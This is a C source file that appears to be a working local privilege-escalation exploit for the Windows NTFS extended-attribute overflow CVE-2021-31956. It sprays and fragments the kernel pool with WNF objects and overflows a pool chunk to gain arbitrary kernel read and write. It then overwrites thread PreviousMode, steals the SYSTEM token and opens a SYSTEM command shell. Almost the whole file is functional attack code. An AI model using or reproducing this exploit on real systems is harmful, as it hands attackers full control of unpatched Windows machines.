#include <stdio.h>
#include <Windows.h>
#include <ntstatus.h>
#include <TlHelp32.h>

#include "CVE-2021-31956.h"

NQSI _NtQuerySystemInformation = (NQSI)NULL;
NQEF _NtQueryEaFile = (NQEF)NULL;
NSEF _NtSetEaFile = (NSEF)NULL;
NCWSN _NtCreateWnfStateName = (NCWSN)NULL;
NUWSD _NtUpdateWnfStateData = (NUWSD)NULL;
NDWSN _NtDeleteWnfStateName = (NDWSN)NULL;
NDWSD _NtDeleteWnfStateData = (NDWSD)NULL;
NQWSD _NtQueryWnfStateData = (NQWSD)NULL;
NRVM _NtReadVirtualMemory = (NRVM)NULL;
NWVM _NtWriteVirtualMemory = (NWVM)NULL;

int main(void)
{
    ULONG_PTR               own_eproc = 0;
    PWNF_STATE_NAME         statenames = zalloc(SPRAY_COUNT * sizeof(WNF_STATE_NAME));
    char                    buf[0xa0] = { 0 };
    ULONG                   buf_sz = sizeof(buf);
    ULONG                   overflow_idx = 0;
    char                    *read_data = zalloc(0x5000);
    char                    *write_data = zalloc(0x5000);
    ULONG                   read_data_sz = 0x5000;
    ULONG                   write_data_sz = 0x5000;
    PWNF_NAME_INSTANCE      arbwrite_name = NULL;
    UINT64                  ext_statename = 0;
    ULONG                   fix_size = 0;
    WNF_CHANGE_STAMP        stamp = 0;
    ULONG_PTR               kthread_flink = 0;
    char                    prev_mode[3] = { 0 };
    char                    old_prev_mode[3] = "\x00\x00\x01";
    PEPROCESS               own_eproc_obj = NULL;
    ULONG_PTR               kthreads[MAX_THREAD_SEARCH] = { 0 };
    ULONG_PTR               threadlisthead = 0;
    PWNF_PROCESS_CONTEXT    ctx = NULL;

    if (!statenames || !read_data || !write_data) {
        log_warn("main::zalloc()1");
        goto out;
    }

    if (!NT_SUCCESS(resolve_symbols()))
        goto out;

    if (!NT_SUCCESS(get_eproc(&own_eproc)))
        goto out;

    if (!NT_SUCCESS(spray_heap(statenames, SPRAY_COUNT, &buf, sizeof(buf))))
        goto out;

    if (!NT_SUCCESS(fragment_heap(statenames, SPRAY_COUNT)))
        goto out;

    if (!NT_SUCCESS(overflow_chunk(OVERFLOW_SZ, OVERFLOW_DATA, OVERFLOW_SZ)))
        goto out;

    while (!NT_SUCCESS(find_chunk(statenames, SPRAY_COUNT, &buf, &buf_sz, &overflow_idx)))
        if (!NT_SUCCESS(overflow_chunk(OVERFLOW_SZ, OVERFLOW_DATA, OVERFLOW_SZ)))
            goto out;

    buf_sz = sizeof(buf);

    if (!NT_SUCCESS(read_pool(statenames, overflow_idx, read_data, &read_data_sz)))
        goto out;

    read_data_sz = 0x5000;
    memcpy(write_data, read_data, 0x5000);

    for (int i = 0; i < 0x5000; i++)
        if ((unsigned char)read_data[i] == 0x03 && (unsigned char)read_data[i + 1] == 0x09 && (unsigned char)read_data[i + 2] == 0xa8) {
            arbwrite_name = (PWNF_NAME_INSTANCE)(&write_data[i]);
            printf("[+] Found a WNF_NAME_INSTANCE structure at offset %x to our corrupted WNF_STATE_DATA\n", i);
            fix_size = i + 0x60;
            break;
        }

    if (!arbwrite_name) {
        log_warn("No WNF_NAME_INSTANCE near our corrupted WNF_STATE_DATA, probably not exploitable");
        goto out;
    }
     
    threadlisthead = (ULONG_PTR)((ULONG_PTR)own_eproc + (ULONG_PTR)0x30);
    arbwrite_name->StateData = threadlisthead;
    
    if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
        goto out;

    ext_statename = *(PULONGLONG)&(arbwrite_name->StateName) ^ STATENAME_CONST;

    _NtQueryWnfStateData((WNF_STATE_NAME *)&ext_statename, NULL, NULL, &stamp, write_data, &write_data_sz); // this call will fail, so we don't error check
    
    kthread_flink = (UINT64)stamp << 32 | (UINT32)write_data_sz;
    write_data_sz = 0x5000;
    memcpy(write_data, read_data, 0x5000);

    kthreads[0] = (UINT64)kthread_flink - (UINT64)0x2f8;
    if ((UINT64)kthreads[0] < 0xFFFF800000000000) {
        log_warn("Fail to find _KTHREAD in memory");
        goto out;
    }

    printf("[+] Found _KTHREAD 1 at %p\n", kthreads[0]);

    for (int i = 1; i < MAX_THREAD_SEARCH; i++) {
        arbwrite_name->StateData = kthread_flink; // find next kthread

        if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
            goto out;

        ext_statename = *(PULONGLONG) & (arbwrite_name->StateName) ^ STATENAME_CONST;

        _NtQueryWnfStateData((WNF_STATE_NAME *)&ext_statename, NULL, NULL, &stamp, write_data, &write_data_sz); // this call will fail, so we don't error check

        kthread_flink = (UINT64)stamp << 32 | (UINT32)write_data_sz;
        if ((UINT64)kthread_flink == (UINT64)threadlisthead)
            break;

        write_data_sz = 0x5000;
        memcpy(write_data, read_data, 0x5000);

        kthreads[i] = (UINT64)kthread_flink - (UINT64)0x2f8;
        if ((UINT64)kthreads[i] < 0xFFFF800000000000) {
            log_warn("Fail to find _KTHREAD in memory");
            goto out;
        }

        printf("[+] Found _KTHREAD %d at %p\n", i+1, kthreads[i]);
    }
    
    for (int i = 0; i < MAX_THREAD_SEARCH; i++) {
        if (kthreads[i] == 0)
            break;

        arbwrite_name->StateData = (UINT64)kthreads[i] + 0x220; // kthread.Process

        if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
            goto out;

        write_data_sz = 0x5000;
        memcpy(write_data, read_data, 0x5000);

        ext_statename = *(PULONGLONG)&(arbwrite_name->StateName) ^ STATENAME_CONST;
        if (!NT_SUCCESS(_NtUpdateWnfStateData((WNF_STATE_NAME *)&ext_statename, prev_mode, 0x3, NULL, NULL, 0, 0))) {
            log_warn("main::_NtUpdateWnfStateData()1");
            goto out;
        }

        printf("[+] Overwritten PreviousMode of _KTHREAD %d to 0\n", i+1);
    }
    

    own_eproc_obj = (PEPROCESS)own_eproc;

    if (!NT_SUCCESS(steal_token(own_eproc_obj)))
        goto out;

    ctx = read64(&(own_eproc_obj->WnfContext));

    if (!NT_SUCCESS(fix_runrefs(ctx)))
        goto out;

    for (int i = 0; i < MAX_THREAD_SEARCH; i++) {
        if (kthreads[i] == 0)
            break;

        arbwrite_name->StateData = (UINT64)kthreads[i] + 0x220; // kthread.Process

        if (!NT_SUCCESS(write_pool(statenames, overflow_idx, write_data, fix_size)))
            goto out;

        write_data_sz = 0x5000;
        memcpy(write_data, read_data, 0x5000);

        ext_statename = *(PULONGLONG) & (arbwrite_name->StateName) ^ STATENAME_CONST;
        if (!NT_SUCCESS(_NtUpdateWnfStateData((WNF_STATE_NAME *)&ext_statename, old_prev_mode, 0x3, NULL, NULL, 0, 0))) {
            log_warn("main::_NtUpdateWnfStateData()1");
            goto out;
        }

        printf("[+] Restored PreviousMode of _KTHREAD %d to 1\n", i + 1);
    }

    if (!NT_SUCCESS(write_pool(statenames, overflow_idx, read_data, fix_size)))
        goto out;

    puts("[+] Restored corrupted adjacent WNF_NAME_INSTANCE");

    if (NT_SUCCESS(create_cmd()))
        puts("[+] Enjoy system shell");

out:
    if (statenames)
        free(statenames);

    if (read_data)
        free(read_data);

    if (write_data)
        free(write_data);

    return 0;
}

NTSTATUS resolve_symbols(void)
{
    NTSTATUS    status = STATUS_SUCCESS;
    HMODULE     ntdll = NULL, tmp = NULL;

    puts("[+] Resolving internal functions...");

    ntdll = ((tmp = GetModuleHandleA("ntdll.dll")) ? tmp : LoadLibraryA("ntdll.dll"));
    if (ntdll == NULL) {
        log_warn("resolve_symbols::LoadLibraryA()1");
        status = STATUS_NOT_FOUND;
        goto out;
    }

    _NtQuerySystemInformation = (NQSI)GetProcAddress(ntdll, "NtQuerySystemInformation");
    _NtQueryEaFile = (NQEF)GetProcAddress(ntdll, "NtQueryEaFile");
    _NtSetEaFile = (NQSI)GetProcAddress(ntdll, "NtSetEaFile");
    _NtCreateWnfStateName = (NCWSN)GetProcAddress(ntdll, "NtCreateWnfStateName");
    _NtUpdateWnfStateData = (NUWSD)GetProcAddress(ntdll, "NtUpdateWnfStateData");
    _NtDeleteWnfStateName = (NDWSN)GetProcAddress(ntdll, "NtDeleteWnfStateName");
    _NtDeleteWnfStateData = (NDWSD)GetProcAddress(ntdll, "NtDeleteWnfStateData");
    _NtQueryWnfStateData = (NQWSD)GetProcAddress(ntdll, "NtQueryWnfStateData");
    _NtReadVirtualMemory = (NRVM)GetProcAddress(ntdll, "NtReadVirtualMemory");
    _NtWriteVirtualMemory = (NWVM)GetProcAddress(ntdll, "NtWriteVirtualMemory");

    if (!_NtQuerySystemInformation || !_NtQueryEaFile || !_NtSetEaFile ||
        !_NtCreateWnfStateName || !_NtUpdateWnfStateData || !_NtDeleteWnfStateName ||
        !_NtDeleteWnfStateData || !_NtQueryWnfStateData || !_NtReadVirtualMemory || !_NtWriteVirtualMemory) {
        log_warn("resolve_symbols::GetProcAddress()1");
        status = STATUS_NOT_FOUND;
        goto out;
    }

    puts("[+] All functions resolved");

out:
    return status;
}

NTSTATUS create_cmd(void)
{
    char                    cmdl[] = "C:\\Windows\\System32\\cmd.exe";
    STARTUPINFOA            si = { 0 };
    PROCESS_INFORMATION     pi = { 0 };
    BOOL                    res;
    NTSTATUS                status = STATUS_SUCCESS;

    si.cb = sizeof(STARTUPINFOA);

    res = CreateProcessA(
        cmdl, NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL,
        &si, &pi
    );

    if (!res) {
        log_warn("create_cmd::CreateProcessA()1");
        status = STATUS_UNSUCCESSFUL;
        goto out;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

out:
    return status;
}

NTSTATUS get_eproc(_Out_ PULONG_PTR eproc)
{
    NTSTATUS                   status = STATUS_UNSUCCESSFUL;
    PSYSTEM_HANDLE_INFORMATION handle_info = NULL;
    UINT64                     handle_info_sz = 0x10000;
    HANDLE                     current_proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetCurrentProcessId());

    printf("[+] Finding _EPROCESS address of current process: %ld\n", GetCurrentProcessId());

    handle_info = (PSYSTEM_HANDLE_INFORMATION)zalloc(handle_info_sz);
    if (!handle_info) {
        log_warn("get_eproc::zalloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }

    while ((status = _NtQuerySystemInformation(
        SystemHandleInformation,
        handle_info,
        handle_info_sz,
        NULL)) == STATUS_INFO_LENGTH_MISMATCH) {

        handle_info = realloc(handle_info, handle_info_sz *= 2);
        if (!handle_info) {
            log_warn("get_eproc::realloc()1");
            status = STATUS_NO_MEMORY;
            goto out;
        }
    }

    if (!NT_SUCCESS(status)) {
        log_warn("get_eproc::NtQuerySystemInformation()1");
        goto out;
    }

    printf("[+] Fetched %ld handles\n", handle_info->NumberOfHandles);

    for (int i = 0; i < handle_info->NumberOfHandles; i++)
        if (handle_info->Handles[i].dwProcessId == GetCurrentProcessId() && handle_info->Handles[i].wValue == current_proc) {
            status = STATUS_SUCCESS;
            printf("[+] _EPROCESS of current process: %p\n", handle_info->Handles[i].pAddress);
            *eproc = (ULONG_PTR)handle_info->Handles[i].pAddress;
            free(handle_info);
            goto out;
        }

out:
    CloseHandle(current_proc);

    return status;
}

NTSTATUS spray_heap(_Out_ PWNF_STATE_NAME statenames, _In_ UINT64 count, _In_ char *buf, _In_ UINT64 buf_sz)
{
    NTSTATUS                status = STATUS_SUCCESS;
    SECURITY_DESCRIPTOR     *sd = (SECURITY_DESCRIPTOR *)zalloc(sizeof(SECURITY_DESCRIPTOR));

    if (!sd) {
        log_warn("spray_heap::zalloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }

    sd->Revision = 0x1;
    sd->Sbz1 = 0;
    sd->Control = 0x800c;
    sd->Owner = 0;
    sd->Group = (PSID)0;
    sd->Sacl = (PACL)0;
    sd->Dacl = (PACL)0;

    for (int i = 0; i < count; i++) {
        status = _NtCreateWnfStateName(&(statenames[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, sd);
        if (!NT_SUCCESS(status)) {
            log_warn("spray_heap::_NtCreateWnfStateName()1");
            goto out;
        }

        status = _NtUpdateWnfStateData(&(statenames[i]), buf, buf_sz, 0, 0, 0, 0); // spray 0xc0 sized kernel chunks
        if (!NT_SUCCESS(status)) {
            log_warn("spray_heap::_NtUpdateWnfStateName()1");
            goto out;
        }
    }

    printf("[+] Sprayed 0x%llx chunks of 0xc0 sized WNF structures\n", count * 2);

out:
    if (sd)
        free(sd);

    return status;
}

NTSTATUS fragment_heap(_Inout_ PWNF_STATE_NAME statenames, _In_ UINT64 count)
{
    NTSTATUS    status = STATUS_SUCCESS;
    UINT64      counter = 0;

    for (int i = 0; i < count; i += 3) {
        // create holes
        status = _NtDeleteWnfStateData(&(statenames[i]), NULL);
        if (!NT_SUCCESS(status)) {
            log_warn("fragment_heap::_NtDeleteWnfStateData()1");
            goto out;
        }

        status = _NtDeleteWnfStateName(&(statenames[i]));
        if (!NT_SUCCESS(status)) {
            log_warn("fragment_heap::_NtDeleteWnfStateData()1");
            goto out;
        }

        statenames[i].Data[0] = 0;
        statenames[i].Data[1] = 0;
        
        counter++;
    }

    printf("[+] Created 0x%llx holes of 0xc0 size in the heap\n", counter * 2);

out:
    return status;
}

NTSTATUS overflow_chunk(_In_ USHORT overflow_chunk_sz, _In_ char *overflow_data, _In_ USHORT overflow_data_sz)
{
    NTSTATUS                    status = STATUS_SUCCESS;
    HANDLE                      file = INVALID_HANDLE_VALUE;
    IO_STATUS_BLOCK             x = { 0 };
    FILE_FULL_EA_INFORMATION    *fetched_data = zalloc(0x300);
    FILE_GET_EA_INFORMATION     *vuln_selector = zalloc(0x300);
    FILE_GET_EA_INFORMATION     *vuln_selector2;
    FILE_FULL_EA_INFORMATION    *payload = zalloc(0x300);
    FILE_FULL_EA_INFORMATION    *overflow;
    
    file = CreateFileA("c:\\users\\chenl\\desktop\\ABC.txt",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (file == INVALID_HANDLE_VALUE) {
        log_warn("overflow_chunk::_CreateFileA()1");
        goto out;
    }

    if (!fetched_data || !vuln_selector || !payload) {
        log_warn("overflow_chunk::zalloc()1");
        goto out;
    }

    vuln_selector->EaNameLength = (UCHAR)strlen(EANAME1);
    memcpy(vuln_selector->EaName, EANAME1, vuln_selector->EaNameLength);
    vuln_selector->NextEntryOffset = (ULONG)0xc;

    vuln_selector2 = (PFILE_GET_EA_INFORMATION)((UINT64)vuln_selector + (UINT64)(vuln_selector->NextEntryOffset));
    vuln_selector2->EaNameLength = (UCHAR)strlen(EANAME2);
    memcpy(vuln_selector2->EaName, EANAME2, vuln_selector2->EaNameLength);
    vuln_selector2->NextEntryOffset = (ULONG)0x0;

    payload->Flags = (UCHAR)0x0;
    payload->EaNameLength = (UCHAR)strlen(EANAME1);
    payload->EaValueLength = (USHORT)0x9d;
    memcpy(payload->EaName, EANAME1, payload->EaNameLength);
    memset(payload->EaName + payload->EaNameLength + 0x1, 'C', payload->EaValueLength);
    payload->NextEntryOffset = (ULONG)((payload->EaNameLength + payload->EaValueLength + 0x3 + 0x9) & (~0x3));

    overflow = (PFILE_FULL_EA_INFORMATION)((UINT64)payload + (UINT64)(payload->NextEntryOffset));
    overflow->NextEntryOffset = (ULONG)0x0;
    overflow->Flags = (UCHAR)0x0;
    overflow->EaNameLength = (UCHAR)strlen(EANAME2);
    overflow->EaValueLength = (USHORT)overflow_chunk_sz;
    memcpy(overflow->EaName, EANAME2, overflow->EaNameLength);
    memcpy(overflow->EaName + overflow->EaNameLength + 0x1, overflow_data, overflow_data_sz); // goal: overflow the first 0x10 bytes after the next pool header, so 0x20 bytes.

    status = _NtSetEaFile(file, &x, payload, 0x300);
    if (!NT_SUCCESS(status)) {
        log_warn("overflow_chunk::_NtSetEaFile()1");
        goto out;
    }

    status = _NtQueryEaFile(file, &x, fetched_data, 0xaa, FALSE, vuln_selector, 0x300, NULL, TRUE);
    if (!NT_SUCCESS(status)) {
        log_warn("overflow_chunk::_NtQueryEaFile()1");
        goto out;
    }

    puts("[+] Overflowed into neighbouring chunk");

out:
    if (file && file != INVALID_HANDLE_VALUE)
        CloseHandle(file);

    if (fetched_data)
        free(fetched_data);

    if (vuln_selector)
        free(vuln_selector);

    if (payload)
        free(payload);

    return status;
}

NTSTATUS find_chunk(_In_ PWNF_STATE_NAME statenames, _In_ UINT64 count, _Out_ char *buf, _Inout_ PULONG buf_sz, _Out_ PULONG idx)
{
    NTSTATUS                status = STATUS_SUCCESS;
    WNF_CHANGE_STAMP        stamp = 0;
    UINT64                  name = 0;
    int                     overflow = -1;

    for (int i = 0; i < count; i++) {
        if (!statenames[i].Data[0])
            continue;

        name = (UINT64)(*(UINT64 *)(statenames[i].Data));
        status = _NtQueryWnfStateData((PCWNF_STATE_NAME)&name, NULL, NULL, &stamp, buf, buf_sz);

        if ((ULONG)stamp == 0x5000) {
            overflow = i; // found our overflow chunk index
            printf("[+] Successfully overflowed into a WNF_STATE_DATA chunk at index 0x%x\n", overflow);
            break;
        }

        if (!NT_SUCCESS(status)) {
            log_warn("find_chunk::_NtQueryWnfStateData()1");
            goto out;
        }
    }

    if (overflow == -1) {
        // means we corrupted a wnf name instance instead of name header, should overflow again.
        // we will fix these corrupted wnf name instances in the end.
        log_warn("Did not overflow a WNF_STATE_DATA chunk, overflow again!");
        status = STATUS_UNSUCCESSFUL;
        goto out;
    }
    else
        status = STATUS_SUCCESS;

    *idx = overflow;

out:
    return status;
}

NTSTATUS read_pool(_In_ PWNF_STATE_NAME statenames, _In_ ULONG idx, _Out_ char *buf, _Inout_ PULONG buf_sz)
{
    NTSTATUS                status = STATUS_SUCCESS;
    WNF_CHANGE_STAMP        stamp = 0;
    UINT64                  name = 0;

    name = (UINT64)(*(UINT64 *)(statenames[idx].Data));

    status = _NtQueryWnfStateData((PCWNF_STATE_NAME)&name, NULL, NULL, &stamp, buf, buf_sz);
    if (!NT_SUCCESS(status)) {
        log_warn("read_pool::_NtQueryWnfStateData()1");
        goto out;
    }

out:
    return status;
}

NTSTATUS write_pool(_In_ PWNF_STATE_NAME statenames, _In_ ULONG idx, _In_ char *buf, _In_ ULONG buf_sz)
{
    NTSTATUS                status = STATUS_SUCCESS;
    UINT64                  name = 0;

    name = (UINT64)(*(UINT64 *)(statenames[idx].Data));

    status = _NtUpdateWnfStateData((PCWNF_STATE_NAME)&name, buf, buf_sz, NULL, NULL, 0, 0);
    if (!NT_SUCCESS(status)) {
        log_warn("write_pool::_NtUpdateWnfStateData()1");
        goto out;
    }

    puts("[+] Successfully updated adjacent WNF_NAME_INSTANCE");

out:
    return status;
}

NTSTATUS steal_token(_In_ PEPROCESS own_eproc)
{
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    PLIST_ENTRY         next = (PLIST_ENTRY)read64(&(own_eproc->ActiveProcessLinks));
    PEPROCESS           cur = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks);

    for (; cur != own_eproc; next = (PLIST_ENTRY)read64(next), cur = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks))
        if ((UINT64)read64(&(cur->UniqueProcessId)) == (UINT64)0x4) {
            write64(&(own_eproc->Token), read64(&(cur->Token)));
            status = STATUS_SUCCESS;
            puts("[+] Stole system token!");
            goto out;
        }

    log_warn("Unable to find system process token");

out:
    return status;
}

NTSTATUS fix_runrefs(_In_ PWNF_PROCESS_CONTEXT ctx)
{
    NTSTATUS            status = STATUS_SUCCESS;
    PLIST_ENTRY         head = (PLIST_ENTRY)read64(&(ctx->TemporaryNamesListHead));
    PLIST_ENTRY         next = read64(head);
    PWNF_NAME_INSTANCE  cur = CONTAINING_RECORD(next, WNF_NAME_INSTANCE, TemporaryNameListEntry);

    for (; next != head; next = read64(next), cur = CONTAINING_RECORD(next, WNF_NAME_INSTANCE, TemporaryNameListEntry))
        if ((UINT64)read64(&(cur->Header)) != (UINT64)0x0000000000A80903) {
            write64(&(cur->Header), (UINT64)0x0000000000A80903);
            write64(&(cur->RunRef), (UINT64)0x0000000000000000);
        }

    puts("[+] Fixed all overwritten header and runrefs");

    return status;
}

UINT64 read64(ULONG_PTR addr)
{
    char    buf[8] = { 0 };
    ULONG   read;

    _NtReadVirtualMemory(GetCurrentProcess(), (PVOID)addr, buf, 0x8, &read);

    return *(UINT64 *)buf;
}

void write64(ULONG_PTR addr, UINT64 data)
{
    char    buf[8] = { 0 };
    ULONG   wrote;

    *(UINT64 *)buf = data;
    _NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)addr, buf, 0x8, &wrote);

    return;
}